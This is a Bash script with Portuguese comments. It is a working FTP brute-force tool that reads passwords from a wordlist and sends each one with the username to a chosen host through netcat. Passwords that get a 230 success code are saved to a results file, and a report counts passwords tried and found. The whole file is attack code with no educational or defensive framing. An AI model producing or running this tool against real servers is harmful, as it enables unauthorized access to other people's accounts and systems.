#!/usr/bin/env bash

clear

### VARIAVEIS

usuario=""
server=""
porta=""
wordl=""
checksum=""



	#### FUNÇÕES ####

ignicao(){

if [[ "$senha" != "$csenhas"  ]];then

											### Envio de credencias FTP

codigo=$(cat <<EOF | nc $server $porta | tail -2 | head -1 | cut -d" " -f1
user $usuario
pass $senha
quit
EOF
)

echo "user[$usuario]pass[$senha]code[$codigo]"

else

											### Muda checksum porque a senha é a mesma - fim

checksum=1

fi

}


	### CONSULTAS ####

echo -n "Usuário: "
read usuario

echo -n "Host: "
read server

echo -n "Porta: "
read porta

echo -n "Caminho wordlist:"
read wordl


	#### START SCRIPT ####

											### Mostra o resultado de uma wordlist
[[ "$1" == "-r" ]]&&cat "$2" &&exit 0

clear
echo ".: INICIANDO SCRIPT BRUTE FORCE - CAM :.

"

											#### Loop para testes das senhas

while [ -z $checksum ];do

	#### ENVIA AS SENHAS ENCONTRADAS PARA UM DB ####

	if [[ $codigo == "230" ]];then
		echo "user[$usuario]pass[$senha]code[$codigo]" >> results/$wordl
		vsenhas=$(($vsenhas + 1))
	fi


	#### REINICIA O TESTE ####

	csenhas="$senha"
	linha=$(($linha + 1))
	senha=$(cat words/$wordl | head -$linha  | tail -1)

	ignicao

done


linha=$(($linha - 1))

echo "

RELATÓRIO:

[ $linha ] Senhas testadas
[ $vsenhas  ] Senhas encontradas
"

exit 0
